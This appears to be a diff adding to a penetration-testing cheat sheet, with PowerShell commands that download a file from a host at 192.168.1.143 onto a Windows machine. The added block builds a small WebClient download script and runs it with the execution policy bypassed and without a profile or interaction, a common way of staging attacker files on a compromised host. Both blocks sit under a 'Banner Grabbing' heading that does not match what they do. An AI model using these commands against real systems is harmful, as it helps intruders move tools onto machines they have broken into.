@@ -45,3 +45,13 @@ USING POWERSHELL -
 **Banner Grabbing**
 	
         powershell.exe Invoke-webRequest -Uri "http://192.168.1.143/1.txt" -OutFile "c:\temp\1.txt"
+
+**Banner Grabbing**
+	
+        echo '$storageDir = $pwd' > wget.ps1
+        echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
+        echo '$url = "http://192.168.1.143/1.txt"' >> wget.ps1
+        echo '$file = "c:\temp\1.txt"' >> wget.ps1
+        echo '$webclient.DownloadFile($url, $file)' >> wget.ps1
+
+        powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
